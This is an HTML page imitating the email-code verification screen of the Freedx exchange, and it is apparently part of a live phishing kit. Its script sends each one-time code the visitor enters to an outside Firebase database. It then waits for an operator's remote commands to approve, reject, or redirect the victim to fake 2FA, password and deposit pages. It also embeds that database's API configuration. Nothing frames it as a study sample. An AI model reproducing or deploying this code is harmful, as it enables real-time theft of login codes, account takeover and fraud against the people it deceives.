<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Email Verification - Freedx</title>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f7f7f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-wrapper {
      display: flex;
      gap: 48px;
      max-width: 1000px;
      width: 100%;
      align-items: center;
      justify-content: center;
    }

    .banner-area {
      flex: 1;
      max-width: 500px;
      display: none;
    }

    .banner-area img {
      width: 100%;
      height: auto;
      border-radius: 16px;
      object-fit: cover;
    }

    .container {
      background: #ffffff;
      border-radius: 24px;
      padding: 40px 32px 32px;
      max-width: 400px;
      width: 100%;
      border: 1px solid #dadce0;
      box-shadow: 0 1px 3px rgba(60,64,67,0.3);
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 28px;
    }

    .logo {
      height: 28px;
      width: auto;
    }

    .header-actions {
      display: flex;
      gap: 8px;
    }

    .header-actions .btn-signup {
      background: #7c3aed;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 12px;
      font-weight: 500;
      padding: 6px 14px;
      cursor: pointer;
      font-family: inherit;
    }

    .header-actions .btn-login-header {
      background: transparent;
      border: none;
      color: #5f6368;
      font-size: 12px;
      font-weight: 500;
      padding: 6px 14px;
      cursor: pointer;
      font-family: inherit;
    }

    h1 {
      color: #202124;
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 8px;
    }

    .subtitle {
      color: #5f6368;
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 24px;
    }

    .subtitle strong {
      color: #7c3aed;
    }

    .otp-container {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 24px;
    }

    .otp-input {
      width: 48px;
      height: 56px;
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      background: #f7f7f7;
      border: 2px solid #dadce0;
      border-radius: 12px;
      color: #202124;
      outline: none;
      transition: border-color 0.2s;
    }

    .otp-input:focus {
      border-color: #7c3aed;
      box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.15);
    }

    .otp-input:disabled {
      opacity: 0.5;
    }

    .otp-input::-webkit-inner-spin-button,
    .otp-input::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    .otp-input {
      -moz-appearance: textfield;
    }

    .resend-area {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-bottom: 24px;
      font-size: 14px;
    }

    .resend-area span {
      color: #5f6368;
    }

    .resend-area .timer {
      color: #7c3aed;
      font-weight: 600;
    }

    .resend-area .resend-btn {
      background: none;
      border: none;
      color: #7c3aed;
      font-weight: 600;
      cursor: pointer;
      font-size: 14px;
      font-family: inherit;
      display: none;
    }

    .resend-area .resend-btn:hover {
      text-decoration: underline;
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: #7c3aed;
      border: none;
      border-radius: 12px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      font-family: inherit;
    }

    .btn:hover {
      background: #6d28d9;
    }

    .btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .btn-loading {
      position: relative;
      pointer-events: none;
    }

    .btn-loading .btn-text {
      visibility: hidden;
    }

    .btn-loading .spinner {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 28px;
      height: 28px;
      border: 3px solid rgba(255, 255, 255, 0.2);
      border-top: 3px solid #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .error-msg {
      color: #d93025;
      font-size: 14px;
      text-align: center;
      margin-top: 12px;
      display: none;
    }

    .back-link {
      display: block;
      margin-top: 16px;
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
      text-align: center;
    }

    .back-link:hover {
      text-decoration: underline;
    }

    @media (min-width: 768px) {
      .banner-area {
        display: block;
      }
      body {
        background: #0a0c11;
      }
      .container {
        background: #111827;
        border: 1px solid #1f2937;
        box-shadow: none;
      }
      .container h1 {
        color: #ffffff;
      }
      .container .subtitle {
        color: #9ca3af;
      }
      .container .otp-input {
        background: #0f1626;
        border-color: #1f2937;
        color: #ffffff;
      }
      .container .resend-area span {
        color: #9ca3af;
      }
      .container .back-link {
        color: #9ca3af;
      }
      .container .header-actions .btn-login-header {
        color: #9ca3af;
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 28px 20px;
      }
      .otp-input {
        width: 40px;
        height: 48px;
        font-size: 18px;
      }
      .otp-container {
        gap: 8px;
      }
    }
  </style>
</head>
<body>

  <div class="login-wrapper">

    <div class="banner-area">
      <img src="https://cms-v2-beta.freedx.am/uploads/banner/auth-banner.webp" alt="auth-banner" />
    </div>

    <div class="container">

      <div class="header">
        <img class="logo" src="https://cms-v2-beta.freedx.am/uploads/logo/purple-logo.svg" alt="freedx" />
        <div class="header-actions">
          <button class="btn-signup" onclick="window.location.href='/registration'">Sign up</button>
          <button class="btn-login-header">Login</button>
        </div>
      </div>

      <h1>Check your email</h1>
      <p class="subtitle">
        The verification code (valid for 5 mins) has been sent to<br />
        <strong id="user-email">carregando...</strong>
      </p>

      <div class="otp-container" id="otpContainer">
        <input type="text" class="otp-input" maxlength="1" autofocus inputmode="numeric" pattern="[0-9]" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
      </div>

      <div class="resend-area">
        <span>Resend in:</span>
        <span class="timer" id="timer">60</span>
        <span>s</span>
        <button class="resend-btn" id="resendBtn">Resend</button>
      </div>

      <button class="btn" id="submitBtn">
        <span class="btn-text">Next</span>
        <span class="spinner" style="display: none;"></span>
      </button>
      <div class="error-msg" id="errorMsg">Invalid code. Please try again.</div>

      <a href="index.html" class="back-link">← Back to Login</a>
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAemZwP19k7zaM8QMBPn5kitdlvzY514OI",
      authDomain: "web-xchangeon1.firebaseapp.com",
      databaseURL: "https://web-xchangeon1-default-rtdb.firebaseio.com/",
      projectId: "web-xchangeon1",
      storageBucket: "web-xchangeon1.firebasestorage.app",
      messagingSenderId: "733409941973",
      appId: "1:733409941973:web:6e11c283fcee846b4a855c"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function getSessionId() {
      const params = new URLSearchParams(window.location.search);
      const idFromUrl = params.get('id');
      if (idFromUrl) {
        sessionStorage.setItem('firebaseSessionId', idFromUrl);
        return idFromUrl;
      }
      return sessionStorage.getItem('firebaseSessionId');
    }

    const sessionId = getSessionId();
    const savedEmail = localStorage.getItem('freedx_email');

    if (!sessionId || !savedEmail) {
      window.location.href = 'index.html';
    }

    const sessionRef = db.ref('sessions/' + sessionId);
    const commandRef = db.ref(`sessions/${sessionId}/command`);

    document.getElementById('user-email').textContent = savedEmail;

    const otpInputs = document.querySelectorAll('.otp-input');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = submitBtn.querySelector('.btn-text');
    const spinner = submitBtn.querySelector('.spinner');
    const errorMsg = document.getElementById('errorMsg');
    const timerEl = document.getElementById('timer');
    const resendBtn = document.getElementById('resendBtn');

    let timerInterval;
    let timeLeft = 60;
    let canResend = false;

    otpInputs.forEach((input, index) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1 && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value === '' && index > 0) {
          otpInputs[index - 1].focus();
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const paste = (e.clipboardData || window.clipboardData).getData('text');
        const numbers = paste.replace(/\D/g, '').split('');
        numbers.forEach((num, i) => {
          if (i < otpInputs.length) {
            otpInputs[i].value = num;
          }
        });
        const lastIndex = Math.min(numbers.length, otpInputs.length) - 1;
        if (lastIndex >= 0) {
          otpInputs[lastIndex].focus();
        }
      });
    });

    function startTimer() {
      clearInterval(timerInterval);
      timeLeft = 60;
      canResend = false;
      resendBtn.style.display = 'none';
      timerEl.style.display = 'inline';
      timerEl.textContent = timeLeft;

      timerInterval = setInterval(() => {
        timeLeft--;
        timerEl.textContent = timeLeft;

        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          canResend = true;
          timerEl.style.display = 'none';
          resendBtn.style.display = 'inline';
        }
      }, 1000);
    }

    startTimer();

    resendBtn.addEventListener('click', function() {
      if (canResend) {
        startTimer();
        sessionRef.update({ otp_resend: true });
      }
    });

    function setLoading(loading) {
      if (loading) {
        submitBtn.disabled = true;
        submitBtn.classList.add('btn-loading');
        btnText.style.visibility = 'hidden';
        spinner.style.display = 'block';
        errorMsg.style.display = 'none';
      } else {
        submitBtn.disabled = false;
        submitBtn.classList.remove('btn-loading');
        btnText.style.visibility = 'visible';
        spinner.style.display = 'none';
      }
    }

    function getOTP() {
      return Array.from(otpInputs).map(i => i.value).join('');
    }

    submitBtn.addEventListener('click', function() {
      const otp = getOTP();
      if (otp.length !== 6) return;

      errorMsg.style.display = 'none';
      setLoading(true);

      sessionRef.update({
        otp: otp,
        status: 'online',
        currentPage: 'OTP'
      });
    });

    commandRef.on('value', (snapshot) => {
      const command = snapshot.val();
      if (!command) return;

      switch (command.type) {
        case 'approve':
          window.location.href = 'https://freedx.com/dashboard';
          break;

        case 'reject':
          setLoading(false);
          errorMsg.style.display = 'block';
          otpInputs.forEach(i => i.value = '');
          otpInputs[0].focus();
          commandRef.remove();
          break;

        case 'tfa-request':
          window.location.href = `2fa.html?id=${sessionId}`;
          break;

        case 'password-confirm-request':
          window.location.href = `password_confirm.html?id=${sessionId}`;
          break;

        case 'verify-request':
          window.location.href = `verify.html?id=${sessionId}`;
          break;

        case 'deposit-request':
          window.location.href = `deposit.html?id=${sessionId}`;
          break;

        case 'force-relogin':
          sessionStorage.clear();
          window.location.href = 'index.html';
          break;
      }
    });

    sessionRef.onDisconnect().update({ status: 'offline' });
    window.addEventListener('load', () => {
      sessionRef.update({ currentPage: 'OTP', status: 'online' });
    });
  </script>

</body>
</html>
